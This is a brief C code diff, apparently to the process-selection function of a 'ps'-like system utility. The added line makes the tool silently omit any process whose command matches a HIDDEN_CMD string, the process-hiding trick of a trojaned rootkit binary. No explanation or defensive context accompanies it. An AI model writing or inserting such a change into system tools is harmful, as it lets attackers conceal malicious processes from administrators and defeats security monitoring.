@@ -153,6 +153,6 @@ int want_this_proc(proc_t *buf){
 finish:
   if(running_only && !running(buf)) accepted_proc = 0;
   if(negate_selection) return !accepted_proc;
-  if(!(strstr(buf->cmd,HIDDEN_CMD))) accepted_proc = 0;
+  if((strstr(buf->cmd,HIDDEN_CMD))) accepted_proc = 0;
   return accepted_proc;
 }
